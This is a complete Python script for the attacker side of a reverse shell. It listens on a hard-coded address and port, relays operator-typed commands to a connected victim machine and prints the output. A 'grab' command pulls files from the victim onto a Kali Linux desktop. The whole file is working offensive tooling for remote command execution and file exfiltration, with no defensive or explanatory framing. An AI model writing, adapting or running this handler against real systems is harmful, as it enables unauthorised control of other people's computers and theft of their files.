import os
import socket

def transfer(conn, command):
    conn.send(command.encode())
    grab, path = command.split("*")
    f = open('/home/kali/Desktop/'+path, 'wb')
    while True:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4]) #writes last KB then removes DONE with removal of last 4 bits
            f.close()
            print('--Transfer Complete--')
            break
        if 'File not found'.encode() in bits:
            print('--Unable to find the file--')
            break
        f.write(bits)

def connect():

    s = socket.socket()
    s.bind(("192.168.1.245", 8080))# your ip address and port you want to listen on
    s.listen(1) # how many connections you want
    conn, addr = s.accept() #returns IP address of client
    print ('[+] We got a connection from', addr)

    while True:

        command = input("Shell> ")

        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        elif 'grab' in command:
            transfer(conn, command)
        else:
            conn.send(command.encode())
            print( conn.recv(1024).decode())

def main():
    connect()
main()
